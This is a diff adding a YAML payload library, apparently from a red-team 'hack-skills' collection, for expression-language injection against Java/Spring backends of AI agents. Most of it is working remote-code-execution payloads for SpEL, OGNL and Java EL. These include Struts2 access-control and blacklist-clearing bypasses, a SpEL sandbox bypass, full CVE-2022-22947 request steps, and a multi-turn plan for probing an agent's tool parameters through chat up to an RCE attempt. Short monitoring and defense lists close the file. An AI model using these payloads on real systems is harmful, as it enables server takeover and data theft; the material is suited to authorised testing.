@@ -1,0 +1,167 @@
+# Expression Language Injection — Agent 场景适配 Payload 库
+# 适配点：Agent 后端 Java / Spring 时，工具可能涉及 SpEL / OGNL / EL 评估
+
+metadata:
+  source: codeaudit/hack-skills/expression-language-injection
+  scope: agent backend (Java/Spring) tool params → EL evaluation
+  layer: L3_tool_call
+  sink_patterns:
+    - "@Value(\"${user_input}\")"
+    - "ExpressionParser.parseExpression(user_input)"
+    - "Ognl.getValue(user_input)"
+    - "@PreAuthorize(user_input)"
+
+# ============ 1. 检测 probes ============
+detection:
+  polyglot:
+    - probe: "${7*7}"
+      resolves_to: 49
+      engines: [SpEL, OGNL, Java EL]
+    - probe: "#{7*7}"
+      resolves_to: 49
+      engines: [SpEL, JSF EL]
+    - probe: "%{7*7}"
+      resolves_to: 49
+      engines: [OGNL (Struts2)]
+    - probe: "${T(java.lang.Math).random()}"
+      engine: SpEL
+  disambiguation:
+    - "${{7*7}}=49, %{7*7}=literal": "SpEL or Java EL"
+    - "${{7*7}}=literal, %{7*7}=49": "OGNL"
+    - "Both =49": "都可能活跃"
+
+# ============ 2. SpEL (Spring) ============
+spel:
+  contexts:
+    - "@Value(\"${...}\") 注解"
+    - "Spring Security (@PreAuthorize)"
+    - "Spring Cloud Gateway routes/filters"
+    - "Thymeleaf th:text=\"${...}\""
+    - "Spring Data @Query with SpEL"
+  rce_basic:
+    - payload: "${T(java.lang.Runtime).getRuntime().exec(\"id\")}"
+  rce_with_output_commons_io:
+    - payload: "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(\"id\").getInputStream())}"
+  rce_with_output_spring_streamutils:
+    - payload: "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()))}"
+  processbuilder_alternative:
+    - payload: "${new java.lang.ProcessBuilder(new String[]{\"id\"}).start()}"
+  spring_cloud_gateway_cve_2022_22947:
+    description: "CVE-2022-22947 SpEL in actuator routes"
+    steps:
+      add_route: |
+        POST /actuator/gateway/routes/hacktest
+        Content-Type: application/json
+        {
+          "id": "hacktest",
+          "filters": [{
+            "name": "AddResponseHeader",
+            "args": {
+              "name": "Result",
+              "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()))}"
+            }
+          }],
+          "uri": "http://example.com",
+          "predicates": [{"name": "Path", "args": {"_genkey_0": "/hackpath"}}]
+        }
+      refresh: "POST /actuator/gateway/refresh"
+      trigger: "GET /hackpath"
+      cleanup: "DELETE /actuator/gateway/routes/hacktest + POST /actuator/gateway/refresh"
+  sandbox_bypass:
+    description: "当 SimpleEvaluationContext 禁用 T() 操作符"
+    payload: "${''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}"
+
+# ============ 3. OGNL (Struts2 / Confluence) ============
+ognl:
+  contexts:
+    - "Apache Struts2（主要 OGNL consumer）"
+    - "Confluence Server（某些请求路径）"
+    - "Ognl.getValue() / setValue()"
+  basic_rce:
+    - payload: "%{(#cmd='id').(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec(#cmd))}"
+  struts2_member_access_bypass:
+    description: "Struts2 SecurityMemberAccess bypass"
+    payload: "%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
+  ognl_util_blacklist_clear:
+    payload: "%{(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.clear()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(#cmd='id').(#rt=@java.lang.Runtime@getRuntime().exec(#cmd))}"
+  struts2_cves:
+    - cve: "S2-045 (CVE-2017-5638)"
+      vector: "Content-Type header"
+      payload: "Content-Type: %{...}"
+    - cve: "S2-046 (CVE-2017-5638)"
+      vector: "Multipart filename"
+    - cve: "S2-016 (CVE-2013-2251)"
+      vector: "redirect: / redirectAction: prefix"
+    - cve: "S2-048 (CVE-2017-9791)"
+      vector: "Struts Showcase - ActionMessage"
+    - cve: "S2-057 (CVE-2018-11776)"
+      vector: "Namespace OGNL in URL path"
+  confluence_cve_2021_26084:
+    payload: "queryString=%5cu0027%2b%7b3*3%7d%2b%5cu0027"
+    detection: "URL-decoded: \\u0027+{3*3}+\\u0027 → 如果响应含 9 → 确认"
+    escalate: "换 Runtime.exec"
+
+# ============ 4. Java EL (JSP / JSF) ============
+java_el:
+  contexts:
+    - "JSP pages: ${expression} 和 #{expression}"
+    - "JSF value/method bindings"
+    - "Custom tag libraries"
+  rce:
+    - payload: "${Runtime.getRuntime().exec(\"id\")}"
+    - payload: "${pageContext.request.getServletContext().getClassLoader()}"
+    - payload: "${\"\".getClass().forName(\"java.lang.Runtime\").getMethod(\"exec\",\"\".getClass()).invoke(\"\".getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null),\"id\")}"
+
+# ============ 5. Agent 场景特化 ============
+agent_specific:
+  description: |
+    Java Agent 后端（如基于 Spring AI / LangChain Java / Spring Cloud Gateway）的 EL 注入
+  high_risk_tool_patterns:
+    - name: "any Spring @Value annotation"
+      severity: critical
+    - name: "Spring Cloud Gateway route/filter"
+      severity: critical
+    - name: "Spring Security expression"
+      severity: high
+    - name: "Struts2 action param"
+      severity: critical
+    - name: "JSP render with user input"
+      severity: critical
+  detection_signals:
+    - "搜索源码中 @Value(\"${...}\")"
+    - "搜索 ExpressionParser / Ognl.getValue"
+    - "搜索 Spring Cloud Gateway 启用 actuator"
+  multi_turn_strategy:
+    turn_1: "询问：'是否使用 Spring / Spring Cloud Gateway / Struts2？'"
+    turn_2: "SpEL 探测：'${7*7}'"
+    turn_3: "OGNL 探测：'%{7*7}'"
+    turn_4: "RCE 尝试"
+
+# ============ 6. SSTI vs EL 区别 ============
+ssti_vs_el:
+  description: |
+    SSTI 目标是模板渲染引擎（Jinja2/FreeMarker/Twig），
+    EL 注入目标是 Java 框架的表达式求值器（SpEL/OGNL/Java EL）
+  shared_probes: "${7*7}, #{7*7}"
+  diverge: "exploitation 不同（SSTI 见 ssti.yaml）"
+
+# ============ 7. 沙箱监控 ============
+sandbox_monitoring:
+  - "JVM 进程 fork /bin/sh, cmd.exe"
+  - "Spring Cloud Gateway 路由变更"
+  - "JSP/Servlet 引擎加载 user_expression"
+  - "agent 进程 → attacker.com（外联命令输出）"
+
+# ============ 8. 防御 ============
+defense:
+  spel:
+    - "使用 SimpleEvaluationContext（限制 T() 操作符）"
+    - "避免用用户输入做 SpEL 表达式"
+    - "Spring Cloud Gateway 禁用 actuator 暴露"
+  ognl:
+    - "升级到最新 Struts2 版本"
+    - "升级 Confluence 到修复版"
+    - "WAF 规则过滤 %{...}"
+  java_el:
+    - "避免 EL 表达式拼接用户输入"
+    - "ELProcessor 沙箱配置"
